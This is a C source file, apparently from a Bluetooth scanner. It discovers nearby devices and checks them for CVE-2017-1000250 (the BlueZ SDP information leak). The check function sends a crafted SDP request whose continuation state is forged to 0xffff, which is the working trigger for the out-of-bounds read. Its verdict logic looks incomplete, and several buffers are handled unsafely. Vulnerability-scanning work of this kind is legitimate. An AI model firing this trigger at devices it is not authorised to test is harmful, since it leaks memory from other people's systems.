#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "bluetooth.h"

#define DEVICENAMELEN           248
#define INQUIRYLEN              15 // This value is multiplied by 1.28 seconds to get the hci_inquiry length
#define MTU                     50
#define SDP_PDU_SVC_PARAM_LEN   7
#define SDP_PDU_ATTR_PARAM_LEN  15
#define SDP_SVC_ATTR_MASK       0x0000ffff
#define SVC_L2CAP               0x0100
#define TID_SEQ_UINT8           0x35
#define TID_UINT64              0x0a
#define TID_UUID_16             0x19
#define TRANSACTION_ID          0x0000

void cont_state_to_char(sdp_cont_state_bluez_t *cont_state, char *dest, uint8_t cont_len)
{
    memset(dest, 0, cont_len + 1);
    uint8_t *len = (char *) dest;
    *len = cont_len;
    uint32_t *timestamp = (uint32_t *) (dest + sizeof(uint8_t));
    *timestamp = htonl(cont_state->timestamp);
    uint16_t *last_index = (uint16_t *) (dest + sizeof(uint8_t) + sizeof(uint32_t));
    *last_index = htons(cont_state->cStateValue.lastIndexSent);
}

char * create_sdp_svc_attr_search_pdu(uint16_t service, char *continuation, size_t continuation_len)
{
    char *pdu = (char *) malloc(MTU);
    memset(pdu, 0, MTU);
    // PDU header
    sdp_pdu_hdr_t *pdu_header = (sdp_pdu_hdr_t *) pdu;
    pdu_header->pdu_id = SDP_SVC_SEARCH_ATTR_REQ;
    pdu_header->tid = TRANSACTION_ID;
    pdu_header->plen = htons(SDP_PDU_ATTR_PARAM_LEN + continuation_len);
    // Create a PDU data element with the service search pattern
    sdp_data_uuid16_t *sdp_pdu_data_svc = (sdp_data_uuid16_t *) (pdu + sizeof(sdp_pdu_hdr_t));
    sdp_pdu_data_svc->dtd = TID_SEQ_UINT8;
    sdp_pdu_data_svc->size = 0x03;
    sdp_pdu_data_svc->data_type = TID_UUID_16;
    sdp_pdu_data_svc->data_value = htons(service);

    uint16_t *max_attr_byte_count = (uint16_t *) (pdu + sizeof(sdp_pdu_hdr_t) + sizeof(sdp_data_uuid16_t));
    *max_attr_byte_count = htons(0xffff);
    // Create a PDU data element with the attribute search pattern
    sdp_data_uuid32_t *sdp_pdu_data_attr = (sdp_data_uuid32_t *) (pdu + sizeof(sdp_pdu_hdr_t) + sizeof(sdp_data_uuid16_t) + sizeof(uint16_t));
    sdp_pdu_data_attr->dtd = TID_SEQ_UINT8;
    sdp_pdu_data_attr->size = 0x05;
    sdp_pdu_data_attr->data_type = TID_UINT64;
    sdp_pdu_data_attr->data_value = htonl(SDP_SVC_ATTR_MASK);

    char *continuation_state = (char *) (pdu + sizeof(sdp_pdu_hdr_t) + sizeof(sdp_data_uuid16_t) + sizeof(uint16_t) + sizeof(sdp_data_uuid32_t));
    if (continuation_len > 0)
    {
        memcpy(continuation_state, continuation, continuation_len);
    } else {
        *continuation_state = 0x00;
    }

    return pdu;
}

char * create_sdp_svc_search_pdu(uint16_t service, char *continuation, size_t continuation_len)
{
    char *pdu = (char *) malloc(MTU);
    memset(pdu, 0, MTU);
    // PDU header
    sdp_pdu_hdr_t *pdu_header = (sdp_pdu_hdr_t *) pdu;
    pdu_header->pdu_id = SDP_SVC_SEARCH_REQ;
    pdu_header->tid = TRANSACTION_ID;
    pdu_header->plen = htons(SDP_PDU_ATTR_PARAM_LEN + continuation_len);
    // Create a PDU data element with the service search pattern
    sdp_data_uuid16_t *sdp_pdu_data = (sdp_data_uuid16_t *) (pdu + sizeof(sdp_pdu_hdr_t));
    sdp_pdu_data->dtd = TID_SEQ_UINT8;
    sdp_pdu_data->size = 0x03;
    sdp_pdu_data->data_type = TID_UUID_16;
    sdp_pdu_data->data_value = htons(service);

    uint16_t *max_service_record = (uint16_t *) (pdu + sizeof(sdp_pdu_hdr_t) + sizeof(sdp_data_uuid16_t));
    *max_service_record = htons(0x0100);

    char *continuation_state = (char *) (pdu + sizeof(sdp_pdu_hdr_t) + sizeof(sdp_data_uuid16_t) + sizeof(uint16_t));
    if (continuation_len > 1)
    {
        memcpy(continuation_state, continuation, continuation_len);
    } else {
        *continuation_state = 0x00;
    }

    return pdu;
}

int extract_cont_state_from_sdp(sdp_cont_state_bluez_t *cont_state, char *pdu)
{
    sdp_pdu_hdr_t *pdu_header = (sdp_pdu_hdr_t *) pdu;
    uint8_t svc_search_attr_rsp = SDP_SVC_SEARCH_ATTR_RSP;
    size_t offset = 0;
    if (pdu_header->pdu_id != svc_search_attr_rsp)
        return -1;
    offset += sizeof(sdp_pdu_hdr_t);
    uint16_t *attr_list_byte_count = (uint16_t *) (pdu + offset);
    *attr_list_byte_count = ntohs(*attr_list_byte_count);
    offset += *attr_list_byte_count + sizeof(uint16_t);
    uint8_t *cont_state_len = (uint8_t *) (pdu + offset);
    char cont_state_value[*cont_state_len];
    offset += sizeof(uint8_t);
    memcpy(cont_state_value, (pdu + offset), *cont_state_len);

    uint32_t *timestamp = (uint32_t *) (pdu + offset);
    offset += sizeof(uint32_t);
    uint16_t *last_index = (uint16_t *) (pdu + offset);
    
    cont_state->timestamp = ntohl(*timestamp);
    cont_state->cStateValue.lastIndexSent = ntohs(*last_index);

    return *cont_state_len;
}

int get_bluetooth_device_id(void)
{
    return hci_get_route(NULL);
}

int is_valid_address(char *address)
{
    return bachk(address) >= 0;
}

int is_vulnerable_to_cve_2017_1000250(bdaddr_t *target)
{
    struct sockaddr_l2 addr = { 0 };
    int sd;
    uint8_t continuation_len = 0;
    int16_t mtu = MTU;
    char *pdu, cont_state_s[9], buf[MTU] = { 0 };
    sdp_cont_state_bluez_t cont_state = { 0 };

    // Return a negative integer indicating failure to create socket
    if ((sd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP)) < 0)
        return -1;
    // Reduce the size of the incoming and outgoing MTU to force the use of a continuation state
    if (set_l2cap_mtu(sd, mtu) < 0)
        return CVE_CHECK_ERR;

    addr.l2_bdaddr = *target;
    addr.l2_family = AF_BLUETOOTH;
    addr.l2_psm = htobs(1);

    pdu = create_sdp_svc_attr_search_pdu(SVC_L2CAP, 0x00, continuation_len);

    if (connect(sd, (struct sockaddr *) &addr, sizeof(addr)) < 0)
        return CVE_CHECK_ERR;
    // Send initial PDU
    if (write(sd, pdu, SDP_PDU_ATTR_PARAM_LEN + sizeof(sdp_pdu_hdr_t)) < 0)
        return CVE_CHECK_ERR;
    // Wait for fragmented response
    if (read(sd, buf, MTU) < 0)
        return CVE_CHECK_ERR;
    // Extract continuation state
    if ((continuation_len = extract_cont_state_from_sdp(&cont_state, buf)) < 0)
        return CVE_CHECK_ERR;

    // Alter the last index of bytes the server sent
    cont_state.cStateValue.lastIndexSent = 0xffff;

    cont_state_to_char(&cont_state, cont_state_s, continuation_len);

    // Free previous PDU
    free(pdu);
    // Create same request with modified continuation state
    pdu = create_sdp_svc_attr_search_pdu(SVC_L2CAP, cont_state_s, continuation_len);

    if (write(sd, pdu, SDP_PDU_ATTR_PARAM_LEN + sizeof(sdp_pdu_hdr_t) + sizeof(uint8_t) + continuation_len) < 0)
        return CVE_CHECK_ERR;
    
    if (read(sd, buf, MTU) < 0)
        return CVE_CHECK_ERR;

    free(pdu);
    close(sd);
    return 0;
}

int open_bluetooth_device(const int device_id)
{
    return hci_open_dev(device_id);
}

int make_hci_inquiry(bdaddr_t **addr_list, const struct bluetooth_connection_info *btinfo)
{
    int inqlen, max_num_resp, flags, num_resp, i;
    inquiry_info *inqinfo = NULL;
    inqlen = INQUIRYLEN;
    max_num_resp = MAXNUMBTRESP;
    // Allocate memory for maximum number of potential devices
    inqinfo = (inquiry_info*)malloc(max_num_resp * sizeof(inquiry_info));

    flags = IREQ_CACHE_FLUSH;

    // Query nearby devices for information
    num_resp = hci_inquiry(btinfo->device_id, inqlen, max_num_resp, NULL, &inqinfo, flags);
    
    for (i = 0; i < num_resp; i++)
    {
        memcpy((*addr_list) + i, &(inqinfo + i)->bdaddr, sizeof(bdaddr_t));
    }

    return num_resp;
}

int set_l2cap_mtu(int sd, uint16_t mtu)
{
    struct l2cap_options opts;
    int len = sizeof(opts);
    int status = getsockopt(sd, SOL_L2CAP, L2CAP_OPTIONS, &opts, &len);
    if (status == 0)
    {
        opts.imtu = opts.omtu = mtu;
        status = setsockopt(sd, SOL_L2CAP, L2CAP_OPTIONS, &opts, len);
    }
    return status;
}
